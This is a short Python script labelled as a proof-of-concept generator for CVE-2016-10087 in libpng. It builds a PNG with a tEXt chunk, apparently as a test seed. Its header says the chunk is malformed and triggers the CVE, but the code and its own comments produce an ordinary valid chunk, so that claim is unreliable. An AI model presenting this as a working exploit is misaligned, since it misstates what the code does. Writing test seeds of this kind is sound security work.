#!/usr/bin/env python3
# generate_cve_2016_10087_poc.py
# Generates a minimal PNG with a malformed tEXt chunk to trigger CVE-2016-10087

import struct
import zlib

def crc32(data):
    """Compute CRC32 for PNG chunk"""
    return zlib.crc32(data) & 0xffffffff

def make_chunk(chunk_type, data):
    """Create a PNG chunk with length, type, data, and CRC"""
    chunk = chunk_type + data
    return struct.pack('>I', len(data)) + chunk + struct.pack('>I', crc32(chunk))

def make_cve_2016_10087_poc():
    # PNG signature (8 bytes)
    signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR: 1x1 pixel, RGB, 8-bit (minimal valid header)
    ihdr_data = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
    ihdr = make_chunk(b'IHDR', ihdr_data)
    
    # tEXt chunk: keyword "Test" + null + malformed data
    # The vulnerability is triggered when libpng processes text chunks
    # with inconsistent internal state. We craft a minimal valid tEXt
    # that exercises png_set_text_2() code path.
    text_keyword = b'Test'
    text_value = b'A' * 100  # Some payload
    text_data = text_keyword + b'\x00' + text_value
    text_chunk = make_chunk(b'tEXt', text_data)
    
    # IDAT: minimal compressed empty scanline (filter byte + 3 RGB bytes)
    raw_scanline = b'\x00' + b'\x80\x80\x80'  # filter=0, gray pixel
    compressed = zlib.compress(raw_scanline, 9)
    idat = make_chunk(b'IDAT', compressed)
    
    # IEND
    iend = make_chunk(b'IEND', b'')
    
    return signature + ihdr + text_chunk + idat + iend

if __name__ == '__main__':
    poc = make_cve_2016_10087_poc()
    with open('seeds/cve_2016_10087_poc.png', 'wb') as f:
        f.write(poc)
    print("✅ PoC written to cve_2016_10087_poc.png")
    print(f"   Size: {len(poc)} bytes")